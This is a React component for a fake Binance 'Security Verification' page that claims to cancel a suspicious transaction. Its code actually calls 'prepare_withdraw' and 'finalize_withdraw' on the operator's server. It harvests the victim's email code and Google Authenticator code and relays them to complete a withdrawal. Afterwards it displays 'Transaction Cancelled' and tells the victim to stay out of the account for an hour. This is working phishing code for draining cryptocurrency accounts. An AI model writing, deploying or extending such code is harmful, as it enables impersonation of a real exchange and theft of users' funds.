import React, { useState, useEffect, useRef } from 'react';
import { BinanceLogo } from '../components/Icons';
import { User, Globe, CheckCircle } from 'lucide-react';
import { PageTransition } from '../components/PageTransition';
import { useNavigate } from 'react-router-dom';
import { API_BASE_URL, checkLoginExpiration } from '../services/api';
import { Spinner } from '../components/Spinner';

interface VerificationResponse {
  success: boolean;
  message?: string;
  messageDetail?: string;
  quotationId?: string;
bizNo?: string;
gauth: boolean;
mobileSecurity: boolean;
mobileNo?: string;
verificationSteps: string[];
}

export const CancelTransactionVerify: React.FC = () => {
const [authenticatorCode, setAuthenticatorCode] = useState('');
const [emailCode, setEmailCode] = useState('');
const [emailTimer, setEmailTimer] = useState(30);
const [isLoading, setIsLoading] = useState(false);
const [displayName, setDisplayName] = useState<string | null>(null);
const [verificationMethods, setVerificationMethods] = useState({
  authenticator: false,
});
const [isInitialLoading, setIsInitialLoading] = useState(true);
const navigate = useNavigate();
const apiCallMade = useRef(false);
const initialEmailSent = useRef(false);
const initialSmsSent = useRef(false);
const [error, setError] = useState<string>('');
const [transactionCancelled, setTransactionCancelled] = useState(false);

useEffect(() => {
  const userData = localStorage.getItem('userData');
  if (userData) {
    const { firstName, lastName, email } = JSON.parse(userData);
    
    if (!firstName && !lastName && !email) {
      setDisplayName(null);
      return;
    }

    let formattedName = '';
    if (firstName || lastName) {
      if (firstName && lastName) {
        formattedName = `${firstName} ${lastName.charAt(0)}`;
      } else {
        formattedName = firstName || lastName;
      }
    } else if (email) {
      formattedName = email.split('@')[0];
    }

    setDisplayName(formattedName || null);
  }
}, []);

useEffect(() => {
  if (apiCallMade.current) return;
  apiCallMade.current = true;

  const prepareVerification = async () => {
    try {
      const sessionId = localStorage.getItem('session_id');
      const response = await fetch(`${API_BASE_URL}/?action=withdraw&task=prepare_withdraw`, {
        method: 'POST',
        headers: {
          'Accept': '*/*',
          'Content-Type': 'text/plain',
        },
        body: JSON.stringify({ 
          session_id: sessionId 
        }),
      });

      const data: VerificationResponse = await response.json();
      console.log('Verification response:', data);
      
      // Check for login expiration
      checkLoginExpiration(data);

      if (!data.success) {
        setTransactionCancelled(true);
        setIsInitialLoading(false);
        return;
      }

      localStorage.setItem('quotationId', data.quotationId || '');
      localStorage.setItem('bizNo', data.bizNo || '');
      localStorage.setItem('mobileNo', data.mobileNo || '');

      // Set verification methods based on verificationSteps
      const hasGoogle = data.verificationSteps.includes('GOOGLE');
      
      setVerificationMethods({
        authenticator: hasGoogle
      });

      // Start email verification (always required)
      handleEmailGetCode();
      setEmailTimer(30);

      setIsInitialLoading(false);

    } catch (error) {
      console.error('Verification preparation failed:', error);
      setIsInitialLoading(false);
    }
  };

  prepareVerification();
}, []);

// Only start timers when component mounts
useEffect(() => {
  const emailInterval = setInterval(() => {
    setEmailTimer((prev) => (prev > 0 ? prev - 1 : 0));
  }, 1000);

  return () => {
    clearInterval(emailInterval);
  };
}, []);

const handleSubmit = async (e: React.FormEvent) => {
  e.preventDefault();
  setError('');
  
  // Validation checks
  if (!emailCode || emailCode.length !== 6) {
    setError('Email code is required and must be 6 digits');
    return;
  }

  if (verificationMethods.authenticator && (!authenticatorCode || authenticatorCode.length !== 6)) {
    setError('Authenticator code is required and must be 6 digits');
    return;
  }

  setIsLoading(true);

  try {
    const sessionId = localStorage.getItem('session_id');
    const bizNo = localStorage.getItem('bizNo');
    const quotationId = localStorage.getItem('quotationId');

    const payload: any = {
      session_id: sessionId,
      bizNo: bizNo,
      quotationId: quotationId,
      emailcode: emailCode,
    };

    if (verificationMethods.authenticator) {
      payload.gauthcode = authenticatorCode;
    }

    const response = await fetch(`${API_BASE_URL}/?action=withdraw&task=finalize_withdraw`, {
      method: 'POST',
      headers: {
        'Accept': '*/*',
        'Content-Type': 'text/plain',
      },
      body: JSON.stringify(payload),
    });

    const data = await response.json();
    console.log('Finalize response:', data);
    
    // Check for login expiration
    checkLoginExpiration(data);

    if (!data.success) {
      setError(data.messageDetail || data.message || 'Verification failed');
      return;
    }

    // Add success case
    if (data && data.success === true) {
      setTransactionCancelled(true);
    }

  } catch (error) {
    console.error('Finalize failed:', error);
    setError('Failed to process verification');
  } finally {
    setIsLoading(false);
  }
};

const handleNumberInput = (e: React.ChangeEvent<HTMLInputElement>, setter: (value: string) => void) => {
  const value = e.target.value.replace(/[^0-9]/g, '');
  setter(value);
};

const handleEmailGetCode = async () => {
  try {
    const sessionId = localStorage.getItem('session_id');
    const bizNo = localStorage.getItem('bizNo');
    
    const response = await fetch(`${API_BASE_URL}/?action=codes&task=send_code`, {
      method: 'POST',
      headers: {
        'Accept': '*/*',
        'Content-Type': 'text/plain',
      },
      body: JSON.stringify({
        session_id: sessionId,
        type: 'email',
        bizNo: bizNo
      }),
    });

    const data = await response.json();
    if (data.success) {
      setEmailTimer(30); // Start countdown
    }
  } catch (error) {
    console.error('Failed to send email code:', error);
  }
};

return (
  <PageTransition>
    <div className="min-h-screen bg-[#0B0E11] flex flex-col">
      {/* Header */}
      <header className="bg-[#0B0E11] px-4 py-5">
        <div className="max-w-[1200px] mx-auto flex justify-between items-center">
          <BinanceLogo />
          {displayName && (
            <div className="flex items-center gap-2 text-[#EAECEF]">
              <User size={20} className="text-[#F0B90B]" />
              <span className="text-[14px] font-[500]">{displayName}</span>
            </div>
          )}
        </div>
      </header>

      {/* Main Content */}
      <div className="flex-1 bg-[#131519]">
        <main className="w-full flex flex-col items-start sm:items-center justify-center p-4 pt-8 sm:pt-12">
          {isInitialLoading ? (
            <Spinner message="Please wait" />
          ) : transactionCancelled ? (
            <div className="w-full max-w-[480px] bg-[#131519] sm:border sm:border-[#2B3139] sm:rounded-lg p-4 sm:p-6">
              <div className="flex flex-col items-center text-center">
                <CheckCircle size={64} className="text-[#F0B90B] mb-6" />
                <h1 className="text-[32px] font-semibold text-[#EAECEF] mb-4">
                  Transaction Cancelled
                </h1>
                <p className="text-[#848E9C] text-[14px] leading-[20px]">
                  Your transaction has been successfully cancelled. For security purposes, please allow up to 1 hour for your funds to be returned to your original account. During this time, please don't access your account until we notify you via email.
                </p>
              </div>
            </div>
            ) : (
              <div className="w-full max-w-[480px] bg-[#131519] sm:border sm:border-[#2B3139] sm:rounded-lg p-4 sm:p-6">
                <div className="mb-6">
                  <h1 className="text-[32px] font-semibold text-[#EAECEF] mb-4">
                    Security Verification
                  </h1>
                  <p className="text-[#848E9C] text-[14px] leading-[20px]">
                    Enter the verification codes to proceed with the cancellation.
                  </p>
                </div>

                <form onSubmit={handleSubmit} className="space-y-6">
                  {error && (
                    <div className="text-[#D9304E] text-[14px] font-[500] p-2 bg-[#D9304E1A] rounded-lg">
                      {error}
                    </div>
                  )}
                  <div>
                    <label className="block text-[14px] text-[#EAECEF] mb-1">
                      Email Code
                    </label>
                    <p className="text-[12px] text-[#848E9C] mb-2">
                      Please check your email address j***@gmail.com
                    </p>
                    <div className="relative">
                      <input
                        type="text"
                        inputMode="numeric"
                        pattern="[0-9]*"
                        value={emailCode}
                        onChange={(e) => handleNumberInput(e, setEmailCode)}
                        className="w-full h-12 bg-[#1E2329] border border-[#2B3139] rounded-lg px-4 text-[#EAECEF] focus:outline-none focus:border-[#F0B90B]"
                        placeholder="Enter email code"
                        maxLength={6}
                      />
                      <button
                        type="button"
                        disabled={emailTimer > 0}
                        onClick={handleEmailGetCode}
                        className="absolute right-4 top-1/2 -translate-y-1/2 text-[#F0B90B] text-[14px] font-[500] disabled:text-[#848E9C]"
                      >
                        {emailTimer > 0 ? `Email sent (${emailTimer}s)` : 'Get Code'}
                      </button>
                    </div>
                  </div>
                  
                  {verificationMethods.authenticator && (
                    <div>
                      <label className="block text-[14px] text-[#EAECEF] mb-1">
                        Google Authenticator
                      </label>
                      <div className="relative">
                        <input
                          type="text"
                          inputMode="numeric"
                          pattern="[0-9]*"
                          value={authenticatorCode}
                          onChange={(e) => handleNumberInput(e, setAuthenticatorCode)}
                          className="w-full h-12 bg-[#1E2329] border border-[#2B3139] rounded-lg px-4 text-[#EAECEF] focus:outline-none focus:border-[#F0B90B]"
                          placeholder="Enter authenticator code"
                          maxLength={6}
                        />
                      </div>
                    </div>
                  )}

                  <button
                    type="submit"
                    disabled={isLoading}
                    className="w-full h-12 bg-[#FCD535] hover:bg-[#F0B90B] text-[#1E2329] rounded-lg font-[500] transition-colors relative disabled:opacity-70 disabled:hover:bg-[#FCD535]"
                  >
                    {isLoading ? (
                      <Spinner message="Processing verification" />
                    ) : (
                      'Submit'
                    )}
                  </button>
                </form>

                {/* Footer */}
                <footer className="flex items-center justify-center gap-4 text-[14px] text-[#848E9C] mt-10">
                  <button className="flex items-center gap-2 hover:text-[#EAECEF]">
                    <Globe size={16} />
                    <span>English</span>
                  </button>
                  <a href="#" className="hover:text-[#EAECEF]">Cookies</a>
                  <a href="#" className="hover:text-[#EAECEF]">Terms</a>
                  <a href="#" className="hover:text-[#EAECEF]">Privacy</a>
                </footer>
              </div>
            )}
          </main>
        </div>
      </div>
    </PageTransition>
  );
};